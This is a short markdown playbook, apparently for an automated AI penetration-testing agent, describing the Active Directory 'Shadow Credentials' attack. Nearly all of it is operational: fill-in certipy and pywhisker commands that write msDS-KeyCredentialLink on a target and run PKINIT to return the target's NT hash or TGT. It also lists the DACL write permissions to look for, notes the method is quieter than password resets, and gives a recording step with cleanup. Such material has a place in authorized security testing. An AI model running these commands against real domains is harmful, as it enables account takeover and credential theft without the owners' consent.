---
name: shadow-credentials
services: [shadow-credentials]
summary: Shadow Credentials — write msDS-KeyCredentialLink for PKINIT auth as the target
---

# Shadow Credentials playbook

If you can write `msDS-KeyCredentialLink` on a user or computer (GenericWrite/GenericAll from a
DACL edge), add your own key credential and authenticate as that object via PKINIT — no password
reset, quieter than RBCD. Use `certipy` or `pywhisker`. The commands below are **examples**.

## Abuse
- Example (certipy, one step): `certipy shadow auto -u <user>@<domain> -p <pass> -account <target> -dc-ip <dc>`
  — adds the key, does PKINIT, returns the target's NT hash / TGT
- Example (pywhisker): `local_exec("pywhisker -d <domain> -u <user> -p <pass> --target <target> --action add")`,
  then PKINIT with the produced cert (`certipy auth` / `gettgtpkinit`)

look for: a write edge (GenericWrite / GenericAll / AddKeyCredentialLink) on a user or computer.

## Record
The recovered hash/TGT = critical; `record_persistence` the key-credential write (cleanup: remove it).
